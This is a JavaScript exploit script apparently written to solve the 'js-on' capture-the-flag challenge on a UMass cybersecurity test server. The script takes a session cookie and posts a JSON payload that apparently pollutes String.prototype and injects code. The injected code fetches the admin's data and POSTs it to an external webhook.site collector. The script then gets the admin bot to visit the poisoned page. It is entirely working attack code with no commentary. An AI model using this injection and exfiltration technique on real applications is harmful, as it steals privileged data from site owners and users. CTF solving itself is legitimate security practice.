
let website = 'http://app.js-on.ctf-test.umasscybersec.org:3000'
let webhook = 'https://webhook.site/f531673e-b58c-4166-ab39-2d436206a091'
let bot = 'http://bot.js-on.ctf-test.umasscybersec.org:9000/'
console.log(JSON.stringify({
    "code":"",
    "js-on":{
        "var_message": "Hello World",
        "var_Error":null,
        "func_Error":`fetch('/code/admin').then(resp=>resp.json().then(json=>fetch('${webhook}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(json)})))`,
        "obj_String":{
            "obj_prototype":{
                "var_split":null
            }
        },
        "var_gg":"thanks for the flag!"
    }
}))
fetch(`${website}/`,{redirect:"manual"}).then(resp=>{
    let cookie = resp.headers.get('set-cookie');

    fetch(`${website}/code`,{method:'POST',headers:{
        'Content-Type':'application/json',
        'Cookie':cookie},
        body:JSON.stringify({
            "code":"",
            "js-on":JSON.stringify({
                "var_message": "Hello World",
                "var_Error":null,
                "func_Error":`fetch('/code/admin').then(resp=>resp.json().then(json=>fetch('${webhook}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(json)})))`,
                "obj_String":{
                    "obj_prototype":{
                        "var_split":null
                    }
                },
                "var_gg":"thanks for the flag!"
            })
        })
    }).then(resp=>{
        fetch(`${bot}lookup`,{method:'POST',headers:{
            'Content-Type':'application/json'},
            body:JSON.stringify({'URL':`${website}/${cookie.split("=")[1]}`})
        }).then(resp=>resp.text().then(console.log))
    })

})


